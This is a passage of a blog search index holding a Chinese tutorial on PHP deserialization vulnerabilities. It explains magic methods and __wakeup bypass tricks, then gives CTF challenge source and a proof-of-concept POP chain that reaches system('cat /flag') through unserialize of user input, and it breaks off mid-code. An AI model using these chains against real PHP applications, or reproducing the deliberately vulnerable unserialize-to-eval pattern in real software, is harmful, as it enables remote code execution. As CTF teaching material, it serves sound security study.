<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CatCTF2022</title>
    <link href="/2026/01/02/CatCTF2022/"/>
    <url>/2026/01/02/CatCTF2022/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JWT详解</title>
    <link href="/2025/12/29/JWT%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/12/29/JWT%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化漏洞</title>
    <link href="/2025/12/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <url>/2025/12/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="PHP反序列化漏洞"><a href="#PHP反序列化漏洞" class="headerlink" title="PHP反序列化漏洞"></a>PHP反序列化漏洞</h1><h2 id="1-基础语法"><a href="#1-基础语法" class="headerlink" title="1.基础语法"></a>1.基础语法</h2><h3 id="1-1-面向对象"><a href="#1-1-面向对象" class="headerlink" title="1.1 面向对象"></a>1.1 面向对象</h3><p><strong>对象实例化</strong>：<code>$对象名 = new 类名();</code></p><p><strong>访问成员</strong></p><ul><li>成员方法：<code>$对象名-&gt;成员方法名();</code></li><li>成员变量：<code>$对象名-&gt;成员变量名;</code></li></ul><p><strong><code>$this</code> 关键字</strong>：在类内部调用本类的成员变量 &#x2F; 方法时使用，如 <code>$this-&gt;变量名</code>&#x2F;<code>$this-&gt;方法名()</code>。</p><h3 id="1-2-序列化与反序列化"><a href="#1-2-序列化与反序列化" class="headerlink" title="1.2 序列化与反序列化"></a>1.2 序列化与反序列化</h3><p>序列化是将对象的状态信息（属性）转换为可以存储或传输的形式的过程。</p><p>对象——(序列化)——-&gt;字符串</p><p>将序列化后的参数还原为实例化的对象</p><p>对象&lt;——(反序列化)——-字符串</p><p>反序列化过程中，unserialize接受的值（字符串）可控；更改这个值（字符串），得到所需要的代码，即生成的对象的属性</p><h2 id="2-魔术方法"><a href="#2-魔术方法" class="headerlink" title="2.魔术方法"></a>2.魔术方法</h2><p>魔术方法是 PHP 预定义的特殊方法，以双下划线<code>__</code>开头，满足条件时自动触发。</p><p><code>__construct()</code></p><ul><li>触发时机：创建对象（实例化类）时自动执行。</li><li>作用：初始化对象的属性、资源等。</li></ul><p><code>__destruct()</code></p><ul><li>触发时机：对象被销毁（脚本结束 &#x2F; 主动 unset）时自动执行。</li><li>作用：释放资源（如关闭数据库连接、文件句柄）。</li></ul><p><code>__clone()</code></p><ul><li>触发时机：使用<code>clone</code>关键字复制对象时执行。</li><li>作用：自定义对象克隆的行为，避免浅拷贝问题。</li></ul><p><strong><code>__set()</code></strong></p><ul><li>触发时机：尝试给<strong>不可访问 &#x2F; 不存在</strong>的成员变量赋值时触发。</li><li>语法：<code>public function __set($name, $value) &#123;&#125;</code>（为变量名，value 为赋值内容）。</li></ul><p><strong><code>__get()</code></strong></p><ul><li>触发时机：尝试获取<strong>不可访问 &#x2F; 不存在</strong>的成员变量值时触发。</li><li>语法：<code>public function __get($name) &#123;&#125;</code>（$name 为变量名）。</li></ul><p><strong><code>__call()</code></strong></p><ul><li>触发时机：调用 **不存在 &#x2F; 不可访问（protected&#x2F;private）**的非静态方法时触发。</li><li>语法：<code>public function __call($method, $args) &#123;&#125;</code>（method为方法名，args 为方法参数数组）。</li></ul><p><strong><code>__callStatic()</code></strong></p><ul><li>触发时机：调用<strong>不存在 &#x2F; 不可访问</strong>的静态方法时触发。</li><li>语法：<code>public static function __callStatic($method, $args) &#123;&#125;</code>。</li></ul><p><strong><code>__toString()</code></strong></p><ul><li>触发时机：将对象当作字符串使用（如 echo、拼接字符串）时触发。</li><li>语法：<code>public function __toString() &#123; return &quot;字符串内容&quot;; &#125;</code>，必须返回字符串，否则报错。</li></ul><p><strong><code>__sleep()</code></strong></p><ul><li>触发时机：执行<code>serialize()</code>序列化对象时触发。</li><li>作用：指定序列化时需要保存的成员变量，返回值为数组（包含要序列化的变量名）。</li><li>语法：<code>public function __sleep() &#123; return [&#39;var1&#39;, &#39;var2&#39;]; &#125;</code>。</li></ul><p><strong><code>__wakeup()</code></strong></p><ul><li>触发时机：执行<code>unserialize()</code>反序列化对象时触发。</li><li>作用：反序列化后恢复对象的状态（如重新建立数据库连接）。</li><li>语法：<code>public function __wakeup() &#123;&#125;</code>。</li></ul><p><img src="https://pic1.imgdb.cn/item/695080d1161224305eb310dc.png"></p><p><img src="https://pic1.imgdb.cn/item/695080ec161224305eb310dd.png"></p><h2 id="3-wake-up绕过"><a href="#3-wake-up绕过" class="headerlink" title="3.__wake-up绕过"></a>3.__wake-up绕过</h2><h3 id="3-1-修改对象属性个数"><a href="#3-1-修改对象属性个数" class="headerlink" title="3.1 修改对象属性个数"></a>3.1 修改对象属性个数</h3><ul><li>PHP5 &lt; 5.6.25</li><li>PHP7 &lt; 7.0.10</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>&#123;<br><span class="hljs-keyword">var</span> <span class="hljs-variable">$target</span> = <span class="hljs-string">&quot;test&quot;</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;target = <span class="hljs-string">&quot;wakeup!&quot;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$fp</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;C:\\phpstudy_pro\\WWW\\unserialize\\shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$fp</span>,<span class="hljs-variable">$this</span>-&gt;target);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$fp</span>);<br>&#125;<br>&#125;<br> <br><span class="hljs-variable">$test</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br><span class="hljs-variable">$test_unseria</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$test</span>);<br> <br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;shell.php&lt;br/&gt;&quot;</span>;<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;.\shell.php&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>unserialize( )会检查是否存在一个wakeup( )方法。本例中存在，则会先调用_wakeup()方法，预先将对象中的target属性赋值为”wakeup!”。所以我们想绕__ wakeup函数，可以修改序列化字符串中表示对象属性个数的值，修改为大于真实的属性个数就会跳过__wakeup的执行。</p><h3 id="3-2-php引用赋值"><a href="#3-2-php引用赋值" class="headerlink" title="3.2 php引用赋值"></a>3.2 php引用赋值</h3><p>在php里，我们可使用引用的方式让两个变量同时指向同一个内存地址，这样对其中一个变量操作时，另一个变量的值也会随之改变。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">&quot;hacker&quot;</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;end = <span class="hljs-variable language_">$this</span>-&gt;start;<br>&#125;<br></code></pre></td></tr></table></figure><p>在__wakeup中有一个赋值操作，我们只需要让end和username互相引用，就可以修改username的值。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>-&gt;end = &amp;<span class="hljs-variable">$a</span>-&gt;username;<br></code></pre></td></tr></table></figure><h3 id="3-3-php-GC回收机制"><a href="#3-3-php-GC回收机制" class="headerlink" title="3.3 php GC回收机制"></a>3.3 php GC回收机制</h3><p>原理：当 <code>is_ref</code> 减少时，会触发 <code>__destuct</code> 魔术方法，由此产生的一些 trick 类型攻击</p><p>当对象为<code>NULL</code>时也是可以触发<code>__destruct</code>的。</p><p>在一个 array 里面存在一个键值对，value 为某个类，当这个类为 NULL 的时候，会被认为是 <code>is_ref</code> 为 0，也就是 false。这就可以触发到 <code>__destruct</code> 方法</p><p>样例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;flag&#123;test_flag&#125;&quot;</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ctf&#x27;</span>]);<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;nonono&#x27;</span>);<br></code></pre></td></tr></table></figure><p>这里因为有异常处理，所以正常情况下是无法<code>__destruct</code>，这时我们就需要利用GC回收机制来触发<code>__destruct</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>  &#125;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;a&#x27;</span>=&gt;<span class="hljs-keyword">new</span> B,<span class="hljs-string">&#x27;b&#x27;</span>=&gt;<span class="hljs-literal">NULL</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-comment">// a:2:&#123;s:1:&quot;a&quot;;O:1:&quot;B&quot;:0:&#123;&#125;s:1:&quot;b&quot;;N;&#125;</span><br></code></pre></td></tr></table></figure><p>得到序列化文本如下</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;b&quot;</span>;N;&#125;<br>对象类型:对象个数:&#123;类型:长度:键名;类型:长度:类名:值类型:长度:键名;类型;&#125;<br>数组:对象个数为<span class="hljs-number">2</span>:&#123;str型:长度<span class="hljs-number">1</span>:键名为<span class="hljs-string">&quot;a&quot;</span>;类:长度为<span class="hljs-number">1</span>:类名为<span class="hljs-string">&quot;B&quot;</span>:值为<span class="hljs-number">0</span> str型:值为<span class="hljs-number">1</span>:键名为<span class="hljs-string">&quot;b&quot;</span>:NULL型;&#125;<br></code></pre></td></tr></table></figure><p>这时我们将键名<code>b</code>改成<code>a</code>，即在反序列化时，会下先让<code>a</code>赋值为类<code>B</code>，之后再将<code>a</code>赋值为<code>NULL</code>，但一开始<code>a</code>已经是对象了，赋值为<code>NULL</code>时就会出现对象为<code>NULL</code>的情况，从而触发<code>__destruct</code>。</p><p>还有一位师傅的做法是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-keyword">array</span>(<span class="hljs-keyword">new</span> B,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>:<span class="hljs-number">2</span>:&#123;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;B&quot;</span>:<span class="hljs-number">0</span>:&#123;&#125;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;<span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>;&#125;<br></code></pre></td></tr></table></figure><p>再修改i:1为i:0 </p><h3 id="3-4-fast-destruct"><a href="#3-4-fast-destruct" class="headerlink" title="3.4 fast destruct"></a>3.4 fast destruct</h3><p>参考：<a href="https://chenxi9981.github.io/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">晨曦</a></p><h2 id="4-实战"><a href="#4-实战" class="headerlink" title="4.实战"></a>4.实战</h2><h3 id="4-1-BaseCTF2024-Really-EZ-POP"><a href="#4-1-BaseCTF2024-Really-EZ-POP" class="headerlink" title="4.1 [BaseCTF2024]Really EZ POP"></a>4.1 [BaseCTF2024]Really EZ POP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sink</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&#x27;echo 123;&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shark</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$word</span> = <span class="hljs-string">&#x27;Hello, World!&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Shark says:&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;word;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sea</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$animal</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$sea_ani</span> = <span class="hljs-variable language_">$this</span>-&gt;animal;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;In a deep deep sea, there is a &#x27;</span> . <span class="hljs-variable">$sea_ani</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Nature</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sea</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;sea-&gt;see;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nature&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$nature</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nature&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sink</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$cmd</span> = <span class="hljs-string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Shark</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$word</span> ;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;word=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sink</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sea</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$animal</span>;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Nature</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$sea</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Nature</span>();<br><span class="hljs-variable">$a</span>-&gt;sea=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sea</span>();<br><span class="hljs-variable">$a</span>-&gt;sea-&gt;animal=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Shark</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>由于 php 版本低于 7.1+，这里注意private字段的处理，保留好访问性。</p><p>php7.1+反序列化对类属性不敏感，php反序列化private属性时可以在序列化时改成public反序列化依然可以,但是反过来就不行了,如果是public你用private就不行。</p><h3 id="4-2-BaseCTF2024-ez-php"><a href="#4-2-BaseCTF2024-ez-php" class="headerlink" title="4.2 [BaseCTF2024]ez_php"></a>4.2 [BaseCTF2024]ez_php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">substrstr</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$start</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;[&quot;</span>);<br>    <span class="hljs-variable">$end</span> = <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&quot;]&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mb_substr</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$start</span> + <span class="hljs-number">1</span>, <span class="hljs-variable">$end</span> - <span class="hljs-number">1</span> - <span class="hljs-variable">$start</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Hacker</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$start</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$username</span>=<span class="hljs-string">&quot;hacker&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$start</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;start=<span class="hljs-variable">$start</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;username=<span class="hljs-string">&quot;hacker&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;end = <span class="hljs-variable language_">$this</span>-&gt;start;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/ctfer/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;username))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Hacker！&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;c-&gt;<span class="hljs-title function_ invoke__">c</span>();<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;C&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$t</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$args</span></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;t-&gt;t;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$f</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;f-&gt;f);<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">E</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$e</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;e)();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">R</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$r</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;r);<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ez_ser.from_you&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ctf</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hacker</span>(<span class="hljs-string">&#x27;&#123;&#123;&#123;&#x27;</span>.<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ez_ser.from_you&#x27;</span>].<span 